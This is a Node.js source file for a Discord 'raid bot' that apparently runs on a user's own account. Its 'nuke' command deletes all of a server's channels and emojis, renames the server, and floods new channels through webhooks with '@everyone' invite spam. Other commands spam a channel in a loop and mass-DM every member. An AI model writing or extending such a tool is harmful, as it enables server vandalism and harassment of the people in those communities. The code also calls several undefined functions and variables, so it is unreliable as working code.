const Discord = require("discord.js")
const fs = require("fs")
const clc = require("cli-color")
const ConsoleTitle = require("node-bash-title")
const { setTimeout } = require("timers")
const wait = require("@trenskow/wait")
const ms = require("ms")
const config = require("./assets/config.json")
const raid = require("./assets/raid.json")
const translate = require('google-translate-api')
const moment = require('moment')
require('moment-duration-format')
const chancejs = require("chance")
const chance = new chancejs()

const bot = new Discord.Client({disableEveryone: true})

let prefix = config.prefixLB

ConsoleTitle("Rain Raidbot")

bot.on("ready", async () =>{
    console.log(clc.blue(`Logged in as ${bot.user.username}`))
    setTimeout( () => {
        console.clear()
        console.log(clc.green("Ready For Client"))
    }, 300)
})

let shortcuts = new Map([
    ['lenny', '( ͡° ͜ʖ ͡°)'],
    ['magic', '(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧'],
    ['yay', '( ﾟヮﾟ)'],
    ['smile', '{◕ ◡ ◕}'],
    ['wizard', '(∩´• . •`)⊃━☆ﾟ.*'],
    ['happy', '╰( ◕ ᗜ ◕ )╯'],
    ['party', '(つ°ヮ°)つ'],
    ['dance', '└╏ ･ ᗜ ･ ╏┐'],
    ['disco', '（〜^∇^)〜'],
    ['woahmagic', '(∩｡･ｏ･｡)っ.ﾟ☆`｡'],
    ['rage', '(┛ಠДಠ)┛彡┻━┻'],
    ['excited', '☆*:. o(≧▽≦)o .:*☆'],
    ['music', '(✿ ◕ᗜ◕)━♫.*･｡ﾟ'],
    ['woah', '【 º □ º 】'],
    ['flipparty', '༼ノ◕ヮ◕༽ノ︵┻━┻'],
    ['sad', '(;﹏;)'],
    ['wink', '(^_-)']
])

bot.on("message", async message => {
    if(message.author.id !== config.clientID) return;
    if(!message.content.startsWith(prefix)) return;
    let args = message.content.substring(prefix.length).split(" ")
    let command = args.shift()
   
    switch(command){ 

        case "ping":
        ping_msg.edit(`🏓 Pong!\nLatency is ${Math.floor(ping_msg.createdTimestamp - message.createdTimestamp)}ms\nAPI Latency is ${Math.round(bot.ws.ping)}ms`);
        break;
        
        case "nuke":
            message.delete()
            message.guild.setIcon("./assets/logo.png")
            message.guild.setName(`${raid.guildname}`)
            message.guild.channels.forEach(c => c.delete())
            message.guild.emojis.forEach(e => e.delete())
            for (var i = 0; i < parseInt(raid.channelam); i++) {message.guild.createChannel(raid.channelnm, {type: 'text'})}
            var webs = await message.guild.channels
            var ws = []
            webs.array().forEach(async(ch) => {
                var wbs = await createWebhook(ch.id, "bonjo")
                ws.push({id: wbs.id, token: wbs.token})
                await sleep(50)
            })
            ws.forEach(wbs => {
                sendWebhook(`https://discord.com/api/webhooks/${wbs.id}/${wbs.token}`, "@everyone https://discord.gg/rain")
            })
        break;

        case "spam":
            message.delete()
            num = 0
            let msg = args[0]
            let amount = args[1]
            let waittime = args[2]
            while(num < amount){
                await wait(waittime + "s")
                num = num + 1
                message.channel.send(msg)   
            }
            break;

        case "stats":
            message.edit("I am on **" + bot.guilds.size + "** servers with **" + bot.users.size + "** users on them")
            break;
    
        case 'uptime':
        message.edit("The uptime is **" + moment.duration(bot.uptime).format(' D [days], H [hrs], m [mins], s [secs]') + "**")
        break;

        case 'serverdm':
            let servermsg = args[0]
                message.guild.members.forEach(member=>{
                    if(member.id == bot.user.id) return;
                    if(member.user.bot) return;
                    member.send(`${servermsg}`);
                    console.log("sent to " + member.name)})
        break;
    
        case 'name':
            message.delete()
            message.channel.send("" + chance.name())
            break;
    
        case 'number':
            message.delete()
            message.channel.send("" + chance.integer({ min: 0, max: 10000 }))
            break;
    
        case 'guildlist':
            message.edit(bot.guilds.forEach(g => { message.edit(g.name) }))
        break;

        case 'emote':
            var emote = Math.floor(Math.random() * shortcuts);
            message.edit(emote)
        break;
   }
})


bot.login(config.clientTK)